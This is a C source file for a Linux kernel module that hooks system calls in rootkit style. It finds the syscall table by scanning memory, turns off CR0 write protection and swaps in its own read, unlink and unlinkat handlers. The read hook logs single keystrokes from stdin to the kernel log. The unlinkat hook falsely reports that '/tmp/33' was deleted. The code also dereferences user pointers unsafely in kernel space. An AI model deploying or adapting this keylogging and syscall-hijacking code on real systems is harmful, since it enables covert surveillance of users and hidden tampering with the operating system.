#include "green.h"

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	ret = ref_sys_read(fd, buf, count);

	if(count == 1 && fd == 0)
		printk(KERN_INFO "Intercept read: %s", buf);

	return ret;
}

asmlinkage long new_sys_unlink(const char __user *pathname){
	long ret;
	ret = ref_sys_unlink(pathname);

	printk(KERN_INFO "Intercept unlink: %s", pathname);

	return ret;
}

asmlinkage long new_sys_unlinkat(int dfd, const char __user * pathname, int flag){
	long ret;

	const char __user * hard_pathname = "/tmp/33";

	if(strcmp(pathname, hard_pathname) == 0){
		printk(KERN_INFO "Path Found");
		return 0; // returns success but never deletes file
	}
	ret = ref_sys_unlinkat(dfd, pathname, flag);

	printk(KERN_INFO "Intercept unlinkAt: %s", pathname);

	return ret;
}

static unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close)
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

static int __init hello_init(void)
{
    printk(KERN_INFO "Sys call hook!\n");

    if(!(sys_call_table = aquire_sys_call_table()))
		return -1;

    printk("Syscall table found at %p\n", sys_call_table);

	// store cpu register (CR0) value
	original_cr0 = read_cr0();

	// disable page protection
	DISABLE_PAGE_PROTECTION;

	ref_sys_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;

	ref_sys_unlink = (void *)sys_call_table[__NR_unlink];
	sys_call_table[__NR_unlink] = (unsigned long *)new_sys_unlink;

	ref_sys_unlinkat = (void *)sys_call_table[__NR_unlinkat];
	sys_call_table[__NR_unlinkat] = (unsigned long *)new_sys_unlinkat;

	// enable page protection
	ENABLE_PAGE_PROTECTION;

    return 0;
}

static void __exit hello_cleanup(void)
{
    printk(KERN_INFO "Cleaning up module.\n");

	if(!sys_call_table) {
		return;
	}

	DISABLE_PAGE_PROTECTION;

	// return original syscall
	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	sys_call_table[__NR_unlink] = (unsigned long *)ref_sys_unlink;
	sys_call_table[__NR_unlinkat] = (unsigned long *)ref_sys_unlinkat;

	ENABLE_PAGE_PROTECTION;

	msleep(2000);
}
